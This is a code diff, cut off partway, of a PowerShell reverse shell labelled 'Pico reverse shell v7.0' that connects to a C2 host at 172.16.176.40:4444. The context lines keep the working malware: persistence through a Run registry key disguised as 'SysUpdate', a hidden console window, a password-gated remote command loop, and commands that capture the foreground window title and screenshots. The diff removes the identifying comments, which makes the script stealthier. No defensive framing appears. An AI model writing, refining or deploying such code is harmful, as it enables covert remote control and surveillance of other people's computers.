@@ -1,12 +1,7 @@
-# Pico reverse shell v7.0 - Auth + Window Tracker + ASCII
-# C2: 172.16.176.40:4444
-
-# --- CONFIGURATION ---
-$ip = '172.16.176.40'; $port = 4444; $pass = "Pico2026" 
+$ip = '172.16.176.40'; $port = 4444; $pass = "biskviti" 
 $reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $name = "SysUpdate"
 $tmp = "$env:TEMP\sysupd.ps1"
 
-# 1. Win32 API Definitions (For Hiding & Window Tracking)
 $api = Add-Type -Name Win32 -MemberDefinition @'
 [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
@@ -14,7 +9,6 @@ $api = Add-Type -Name Win32 -MemberDefinition @'
 '@ -PassThru
 $api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-# 2. Helper function for cleanup (Self-Destruct)
 function Die {
     Remove-ItemProperty -Path $reg -Name $name -Force -ErrorAction SilentlyContinue
     Stop-Process -Id $PID -Force
@@ -24,7 +18,6 @@ while($true) {
     try {
         $c = New-Object System.Net.Sockets.TCPClient($ip, $port); $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
         
-        # --- PHASE 1: AUTHENTICATION ---
         $s.Write(($e.GetBytes("AUTH REQUIRED: ")), 0, 15)
         [byte[]]$authB = New-Object byte[] 64; $len = $s.Read($authB, 0, $authB.Length)
         $attempt = $e.GetString($authB, 0, $len).Trim()
@@ -36,14 +29,12 @@ while($true) {
 
         $s.Write(($e.GetBytes("ACCESS GRANTED. Commands: screen, screenshot, kill`nPS $PWD> ")), 0, 58)
 
-        # --- PHASE 2: MAIN LOOP ---
         [byte[]]$b = New-Object byte[] 65535
         while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
             $in = $e.GetString($b, 0, $i).Trim(); $out = ""
 
             if ($in -eq 'kill') { Die }
             
-            # [COMMAND] SCREEN - Get Active Window
             elseif ($in -eq 'screen') {
                 $handle = $api::GetForegroundWindow()
                 $sb = New-Object System.Text.StringBuilder 256
@@ -51,7 +42,6 @@ while($true) {
                 $out = "[!] Active Window: " + $sb.ToString() + "`n"
             }
 
-            # [COMMAND] SCREENSHOT - ASCII View
             elseif ($in -eq 'screenshot') {
                 try {
                     Add-Type -AssemblyName System.Windows.Forms, System.Drawing
